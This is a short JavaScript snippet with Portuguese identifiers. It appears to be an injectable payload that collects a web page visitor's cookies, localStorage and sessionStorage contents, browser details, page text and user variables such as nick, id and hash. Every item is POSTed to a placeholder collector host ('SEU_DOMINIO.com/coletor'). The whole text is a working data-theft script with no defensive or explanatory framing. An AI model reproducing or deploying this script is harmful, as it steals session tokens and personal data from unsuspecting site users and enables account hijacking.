(function () {
  const send = (dados) => {
    fetch('https://SEU_DOMINIO.com/coletor', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(dados)
    });
  };

  const coletado = {
    timestamp: new Date().toISOString(),
    url: location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    cookies: document.cookie,
    localStorage: { ...localStorage },
    sessionStorage: { ...sessionStorage },
    screen: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
    },
    domDump: document.body.innerText.slice(0, 5000),
  };

  if (typeof nick !== 'undefined') coletado.nick = nick;
  if (typeof id !== 'undefined') coletado.userId = id;
  if (typeof hash !== 'undefined') coletado.userHash = hash;
  if (typeof pagina !== 'undefined') coletado.pagina = pagina;

  send(coletado);
})();